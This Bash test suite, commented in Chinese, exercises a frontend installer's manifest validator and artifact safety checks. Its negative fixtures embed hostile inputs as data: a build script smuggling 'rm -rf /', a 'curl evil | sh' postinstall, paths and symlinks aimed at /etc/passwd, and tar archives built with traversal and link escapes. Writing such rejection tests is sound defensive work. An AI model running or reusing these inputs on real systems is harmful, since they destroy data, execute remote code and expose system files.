#!/usr/bin/env bash
#
# frontend.sh 的契约与安全负向测试（Phase 12.1）。
#
# 覆盖：
#   - manifest 严格校验（与 @floatctf/frontend-runtime 的 parseFrontendManifest 同规则）
#   - 源码 manifest 的 build 契约（packageManager / script / outputDir）
#   - 公开注册表数据边界（绝不写入安装来源）
#   - 制品树安全（符号链接 / FIFO / 特殊文件，任何安装来源都一样）
#   - 前端版本不可变（同 ID+版本=同字节；没有 --reinstall 例外）
#   - currentVersion 是显式指针（删除当前版本前必须先 set-current）
#   - 构建身份绝不为 UID 0（普通用户 / sudo / root 直调）
#
# 全部在临时 FLOATCTF_HOME 内进行，不碰真实安装根，也不需要 docker。
set -Eeuo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
FRONTEND_SH="$ROOT/scripts/frontend.sh"

PASS=0
FAIL=0
note() { printf '  %s\n' "$*"; }
pass() { PASS=$((PASS + 1)); printf '  \033[32m✓\033[0m %s\n' "$1"; }
fail() { FAIL=$((FAIL + 1)); printf '  \033[31m✗\033[0m %s\n' "$1"; }

WORK="$(mktemp -d "${TMPDIR:-/tmp}/fcft-frontend-test.XXXXXX")"
cleanup() { chmod -R u+w "$WORK" 2>/dev/null || true; rm -rf "$WORK"; }
trap cleanup EXIT

export FLOATCTF_HOME="$WORK/home"
export FRONTENDS_ROOT="$FLOATCTF_HOME/frontends"
mkdir -p "$FRONTENDS_ROOT"

fe() { "$FRONTEND_SH" "$@"; }

# ── fixture 生成 ────────────────────────────────────────────────────────────

# make_artifact <dir> <id> <version> [extra-manifest-json]
make_artifact() {
    local dir="$1" id="$2" version="$3" extra="${4:-}"
    mkdir -p "$dir/assets"
    printf 'export function mount() {}\n' >"$dir/assets/app.js"
    printf 'body { color: red }\n' >"$dir/assets/app.css"
    python3 - "$dir/frontend.json" "$id" "$version" "$extra" <<'PY'
import json, sys
path, fid, version, extra = sys.argv[1:5]
manifest = {
    "schemaVersion": 1,
    "id": fid,
    "name": f"{fid} test frontend",
    "version": version,
    "compatibility": {"frontendRuntime": "1", "apiContract": "1"},
    "entry": "assets/app.js",
    "styles": ["assets/app.css"],
}
if extra:
    manifest.update(json.loads(extra))
open(path, "w", encoding="utf-8").write(json.dumps(manifest, indent=2) + "\n")
PY
}

# make_source <dir> <id> <version> [build-json] [manifest-extra-json]
make_source() {
    local dir="$1" id="$2" version="$3" build="${4:-}" extra="${5:-}"
    mkdir -p "$dir"
    printf '{"name":"fixture","private":true,"scripts":{"build":"true"}}\n' >"$dir/package.json"
    python3 - "$dir/floatctf.frontend.json" "$id" "$version" "$build" "$extra" <<'PY'
import json, sys
path, fid, version, build, extra = sys.argv[1:6]
manifest = {
    "schemaVersion": 1,
    "id": fid,
    "name": f"{fid} source frontend",
    "version": version,
    "compatibility": {"frontendRuntime": "1", "apiContract": "1"},
    "entry": "assets/app.js",
    "styles": ["assets/app.css"],
}
if build:
    manifest["build"] = json.loads(build)
if extra:
    manifest.update(json.loads(extra))
open(path, "w", encoding="utf-8").write(json.dumps(manifest, indent=2) + "\n")
PY
    # 预构建产物，供 --no-build 使用
    mkdir -p "$dir/dist/assets"
    printf 'export function mount() {}\n' >"$dir/dist/assets/app.js"
    printf 'body{}\n' >"$dir/dist/assets/app.css"
    python3 - "$dir/dist/frontend.json" "$id" "$version" <<'PY'
import json, sys
path, fid, version = sys.argv[1:4]
open(path, "w", encoding="utf-8").write(json.dumps({
    "schemaVersion": 1,
    "id": fid,
    "name": f"{fid} source frontend",
    "version": version,
    "compatibility": {"frontendRuntime": "1", "apiContract": "1"},
    "entry": "assets/app.js",
    "styles": ["assets/app.css"],
}, indent=2) + "\n")
PY
}

expect_fail() { # <label> <cmd...>
    local label="$1"; shift
    if "$@" >"$WORK/out.log" 2>&1; then
        fail "$label（预期失败但成功了）"
        sed 's/^/      /' "$WORK/out.log" | head -3
        return 1
    fi
    pass "$label"
    return 0
}

expect_ok() { # <label> <cmd...>
    local label="$1"; shift
    if ! "$@" >"$WORK/out.log" 2>&1; then
        fail "$label（预期成功但失败了）"
        sed 's/^/      /' "$WORK/out.log" | head -5
        return 1
    fi
    pass "$label"
    return 0
}

registry_contains() { grep -q -- "$1" "$FRONTENDS_ROOT/registry.json"; }

echo "== 1. manifest 严格校验（与 runtime 解析器同规则）=="
V="$WORK/manifest-cases"
mkdir -p "$V"
mk() { printf '%s' "$2" >"$V/$1.json"; }

mk good '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js","styles":["assets/app.css"]}'
mk bad-unknown '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js","source":"/home/me/x"}'
mk bad-schema '{"schemaVersion":2,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js"}'
mk bad-id '{"schemaVersion":1,"id":"../evil","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js"}'
mk bad-semver '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js"}'
mk bad-name '{"schemaVersion":1,"id":"demo","name":"","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js"}'
mk bad-name-long "{\"schemaVersion\":1,\"id\":\"demo\",\"name\":\"$(printf 'x%.0s' $(seq 1 129))\",\"version\":\"1.0.0\",\"compatibility\":{\"frontendRuntime\":\"1\",\"apiContract\":\"1\"},\"entry\":\"assets/app.js\"}"
mk bad-desc-long "{\"schemaVersion\":1,\"id\":\"demo\",\"name\":\"Demo\",\"version\":\"1.0.0\",\"description\":\"$(printf 'x%.0s' $(seq 1 1025))\",\"compatibility\":{\"frontendRuntime\":\"1\",\"apiContract\":\"1\"},\"entry\":\"assets/app.js\"}"
mk bad-author-long "{\"schemaVersion\":1,\"id\":\"demo\",\"name\":\"Demo\",\"version\":\"1.0.0\",\"author\":\"$(printf 'x%.0s' $(seq 1 257))\",\"compatibility\":{\"frontendRuntime\":\"1\",\"apiContract\":\"1\"},\"entry\":\"assets/app.js\"}"
mk bad-compat-key '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1","buildHost":"ci"},"entry":"assets/app.js"}'
mk bad-runtime '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"9","apiContract":"1"},"entry":"assets/app.js"}'
mk bad-api '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"9"},"entry":"assets/app.js"}'
mk bad-sdk-type '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1","sdk":1},"entry":"assets/app.js"}'
mk bad-entry-abs '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"/etc/passwd"}'
mk bad-entry-traversal '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"../../evil.js"}'
mk bad-entry-scheme '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"https://evil.example/x.js"}'
mk bad-styles-type '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js","styles":"assets/app.css"}'
mk bad-style-path '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js","styles":["../x.css"]}'
mk bad-build-in-artifact '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js","build":{"script":"build"}}'
python3 - "$V/bad-styles-many.json" <<'PY'
import json, sys
json.dump({"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0",
           "compatibility":{"frontendRuntime":"1","apiContract":"1"},
           "entry":"assets/app.js","styles":[f"s{i}.css" for i in range(17)]},
          open(sys.argv[1], "w"))
PY

for case in good; do
    expect_ok "manifest/$case 接受" fe _manifest-validate-json "$V/$case.json" false
done
for case in bad-unknown bad-schema bad-id bad-semver bad-name bad-name-long bad-desc-long \
            bad-author-long bad-compat-key bad-runtime bad-api bad-sdk-type bad-entry-abs \
            bad-entry-traversal bad-entry-scheme bad-styles-type bad-style-path \
            bad-styles-many bad-build-in-artifact; do
    expect_fail "manifest/$case 拒绝" fe _manifest-validate-json "$V/$case.json" false
done

echo "== 2. 源码 manifest 的 build 契约 =="
S="$WORK/source-cases"
mkdir -p "$S"
mks() { printf '%s' "$2" >"$S/$1.json"; }
mks good-build '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js","build":{"packageManager":"pnpm","script":"build:floatctf","outputDir":"out-ui"}}'
mks bad-pm '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js","build":{"packageManager":"bun"}}'
mks bad-script '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js","build":{"script":"build; rm -rf /"}}'
mks bad-outdir '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js","build":{"outputDir":"../../etc"}}'
mks bad-build-key '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js","build":{"postinstall":"curl evil | sh"}}'
expect_ok "source/build 合法" fe _manifest-validate-json "$S/good-build.json" true
expect_fail "source/build packageManager 非法" fe _manifest-validate-json "$S/bad-pm.json" true
expect_fail "source/build script 含 shell 注入" fe _manifest-validate-json "$S/bad-script.json" true
expect_fail "source/build outputDir 穿越" fe _manifest-validate-json "$S/bad-outdir.json" true
expect_fail "source/build 未知键" fe _manifest-validate-json "$S/bad-build-key.json" true

echo "== 3. 安装 + 公开注册表数据边界 =="
A1="$WORK/art-direct"
make_artifact "$A1" demo 1.0.0
expect_ok "安装预构建目录 demo@1.0.0" fe install "$A1" --make-current
if registry_contains '"source"'; then
    fail "注册表不得包含 source 字段"
else
    pass "注册表不含 source 字段"
fi
if grep -qE "$WORK|/home/|/tmp/" "$FRONTENDS_ROOT/registry.json"; then
    fail "注册表不得包含本地路径"
    grep -nE "$WORK|/home/|/tmp/" "$FRONTENDS_ROOT/registry.json" | head -3
else
    pass "注册表不含本地路径/临时路径"
fi
expect_ok "注册表通过公开 schema 自检" fe list

# Git 来源：raw registry 同样不得留下 clone URL
GITSRC="$WORK/git-src"
make_source "$GITSRC" gitdemo 2.0.0
( cd "$GITSRC" && git init -q && git config user.email t@e && git config user.name t \
    && git add -A && git commit -qm init )
expect_ok "从 Git 来源安装 gitdemo@2.0.0（--no-build）" \
    fe install "file://$GITSRC" --no-build --make-current
if registry_contains 'file://' || registry_contains "$GITSRC"; then
    fail "Git 安装不得把 clone URL 写进公开注册表"
else
    pass "Git 安装未把 clone URL 写进注册表"
fi

# 历史遗留的 source 字段必须在下次写入时被清除（sanitize）
python3 - "$FRONTENDS_ROOT/registry.json" <<'PY'
import json, sys
p = sys.argv[1]
data = json.load(open(p))
data["frontends"]["demo"]["versions"]["1.0.0"]["source"] = "git:https://user:token@example/repo.git"
json.dump(data, open(p, "w"), indent=2)
PY
expect_ok "遗留 source 的注册表仍可被管理器读取" fe list
expect_ok "再次安装同内容触发注册表重写" fe install "$A1"
if registry_contains '"source"'; then
    fail "重写后仍未清除遗留 source"
else
    pass "重写后遗留 source 已被 sanitize"
fi

echo "== 4. 制品树安全（任何安装来源）=="
T="$WORK/tree-cases"
# 4.1 frontend.json 是符号链接
D="$T/manifest-symlink"; make_artifact "$D" linkdemo 1.0.0
rm "$D/frontend.json"; ln -s "$WORK/art-direct/frontend.json" "$D/frontend.json"
expect_fail "拒绝 frontend.json 符号链接" fe install "$D"
# 4.2 entry 指向 /etc/passwd
D="$T/entry-symlink"; make_artifact "$D" linkdemo 1.0.0
rm "$D/assets/app.js"; ln -s /etc/passwd "$D/assets/app.js"
expect_fail "拒绝 entry 符号链接（→ /etc/passwd）" fe install "$D"
# 4.3 相对符号链接逃逸
D="$T/relative-symlink"; make_artifact "$D" linkdemo 1.0.0
ln -s ../../../etc/passwd "$D/assets/escape.js"
expect_fail "拒绝相对符号链接逃逸" fe install "$D"
# 4.4 style 符号链接
D="$T/style-symlink"; make_artifact "$D" linkdemo 1.0.0
rm "$D/assets/app.css"; ln -s /etc/hostname "$D/assets/app.css"
expect_fail "拒绝 style 符号链接" fe install "$D"
# 4.5 FIFO
D="$T/fifo"; make_artifact "$D" linkdemo 1.0.0
mkfifo "$D/assets/pipe" 2>/dev/null || true
if [ -p "$D/assets/pipe" ]; then
    expect_fail "拒绝 FIFO 制品成员" fe install "$D"
else
    note "（跳过 FIFO 用例：本机无法 mkfifo）"
fi
# 4.6 归档成员安全：每个恶意归档都同时含**合法制品**，确保拒绝理由必须来自成员校验
mkdir -p "$WORK/arch"
make_artifact "$WORK/arch/base" archdemo 1.0.0
python3 - "$WORK/arch" <<'PYTAR'
import io, os, sys, tarfile
base = sys.argv[1]
src = os.path.join(base, "base")
app = open(os.path.join(src, "assets/app.js"), "rb").read()
css = open(os.path.join(src, "assets/app.css"), "rb").read()
manifest = open(os.path.join(src, "frontend.json"), "rb").read()


def add_bytes(tf, name, payload):
    info = tarfile.TarInfo(name)
    info.size = len(payload)
    tf.addfile(info, io.BytesIO(payload))


def valid_members(tf):
    add_bytes(tf, "frontend.json", manifest)
    add_bytes(tf, "assets/app.js", app)
    add_bytes(tf, "assets/app.css", css)


# 穿越
with tarfile.open(os.path.join(base, "traversal.tar.gz"), "w:gz") as tf:
    valid_members(tf)
    add_bytes(tf, "../evil.js", app)
# 绝对路径
with tarfile.open(os.path.join(base, "absolute.tar.gz"), "w:gz") as tf:
    valid_members(tf)
    add_bytes(tf, "/tmp/evil.js", app)
# 符号链接（逃逸到 /etc/passwd）
with tarfile.open(os.path.join(base, "symlink.tar.gz"), "w:gz") as tf:
    valid_members(tf)
    link = tarfile.TarInfo("assets/escape.js")
    link.type = tarfile.SYMTYPE
    link.linkname = "/etc/passwd"
    tf.addfile(link)
# 硬链接
with tarfile.open(os.path.join(base, "hardlink.tar.gz"), "w:gz") as tf:
    valid_members(tf)
    hard = tarfile.TarInfo("assets/hard.js")
    hard.type = tarfile.LNKTYPE
    hard.linkname = "assets/app.js"
    tf.addfile(hard)
PYTAR

expect_fail_msg() { # <label> <expected-substring> <cmd...>
    local label="$1" needle="$2"; shift 2
    if "$@" >"$WORK/out.log" 2>&1; then
        fail "$label（预期失败但成功了）"
        return 1
    fi
    if grep -q -- "$needle" "$WORK/out.log"; then
        pass "$label"
    else
        fail "$label（拒绝理由不是「$needle」）"
        sed 's/^/      /' "$WORK/out.log" | head -3
    fi
}

expect_fail_msg "拒绝归档成员 ../ 穿越" "含 .." fe install "$WORK/arch/traversal.tar.gz"
expect_fail_msg "拒绝归档成员绝对路径" "绝对路径" fe install "$WORK/arch/absolute.tar.gz"
expect_fail_msg "拒绝含符号链接的归档" "符号链接" fe install "$WORK/arch/symlink.tar.gz"
expect_fail_msg "拒绝含硬链接的归档" "硬链接" fe install "$WORK/arch/hardlink.tar.gz"

cd "$ROOT"
if [ -d "$FRONTENDS_ROOT/linkdemo" ] || [ -d "$FRONTENDS_ROOT/archdemo" ]; then
    fail "被拒绝的安装不得留下任何已安装资产"
else
    pass "被拒绝的安装未留下资产"
fi

echo "== 5. 前端版本不可变 =="
B="$WORK/immutable"
make_artifact "$B" immut 1.0.0
expect_ok "首次安装 immut@1.0.0" fe install "$B" --make-current
expect_ok "同版本同内容重复安装（幂等）" fe install "$B"
expect_fail "选项 --reinstall 已不存在" fe install "$B" --platform --reinstall
printf 'different bytes\n' >>"$B/assets/app.js"
expect_fail "同版本不同内容被拒绝（第三方）" fe install "$B"
expect_fail "同版本不同内容被拒绝（--platform 也不例外）" fe install "$B" --platform
B2="$WORK/immutable-platform"
make_artifact "$B2" default 1.0.0
expect_ok "平台安装 default@1.0.0" fe install "$B2" --platform --make-current
printf 'changed default bytes\n' >>"$B2/assets/app.js"
expect_fail "default 同版本不同内容也被拒绝（必须升版本号）" fe install "$B2" --platform

echo "== 6. currentVersion 是显式指针 =="
C="$WORK/pointer"
make_artifact "$C" ptr 1.0.0
expect_ok "安装 ptr@1.0.0" fe install "$C" --make-current
make_artifact "$C" ptr 1.1.0
expect_ok "安装 ptr@1.1.0（移动指针）" fe install "$C" --make-current
expect_fail "删除 currentVersion 且仍有其它版本 → 拒绝" fe remove ptr 1.1.0
if [ -d "$FRONTENDS_ROOT/ptr/1.1.0" ]; then
    pass "拒绝后资产未被删除（无不一致状态）"
else
    fail "拒绝后资产被误删"
fi
expect_ok "先 set-current 到 1.0.0" fe set-current ptr 1.0.0
expect_ok "再删除 1.1.0" fe remove ptr 1.1.0
expect_ok "删除最后一个版本（整条移除）" fe remove ptr 1.0.0
# 预发布版本混排不得崩溃（旧实现用 int/str 混合排序，会 TypeError）。
# 注意：每次安装前都必须重写源目录的 manifest，否则四次安装都是同一个版本。
P="$WORK/prerelease"
make_artifact "$P" pre 1.0.0-alpha
expect_ok "安装 1.0.0-alpha" fe install "$P" --make-current
make_artifact "$P" pre 1.0.0-1
expect_ok "安装 1.0.0-1" fe install "$P"
make_artifact "$P" pre 1.0.0-beta.1
expect_ok "安装 1.0.0-beta.1" fe install "$P"
make_artifact "$P" pre 1.0.0
expect_ok "安装 1.0.0" fe install "$P"
expect_ok "预发布混排下列表正常" fe list
expect_ok "把指针显式指向 1.0.0" fe set-current pre 1.0.0
expect_fail "删除 currentVersion(1.0.0) 被拒绝" fe remove pre 1.0.0
expect_ok "删除非当前版本（1.0.0-beta.1）" fe remove pre 1.0.0-beta.1

echo "== 7. 构建身份绝不为 0 =="
for args in "1000 1000" "0 1234 5678" "0" "0 0 0"; do
    # shellcheck disable=SC2086
    out="$(fe _resolve-build-identity $args)"
    if [ "${out%%:*}" = "0" ]; then
        fail "构建身份不得为 UID 0（输入: $args → $out）"
    else
        pass "构建身份非 0（输入: $args → $out）"
    fi
done
if [ "$(id -u)" != "0" ]; then
    out="$(fe build-identity)"
    [ "${out%%:*}" != "0" ] && pass "普通用户直接调用 → 非 0（$out）" || fail "普通用户调用得到 UID 0"
fi
out="$(SUDO_UID=4242 SUDO_GID=4242 fe build-identity)"
[ "$out" = "4242:4242" ] && pass "sudo 场景使用 SUDO_UID/SUDO_GID" || fail "sudo 场景身份错误: $out"

echo
printf '通过 %d 项，失败 %d 项\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
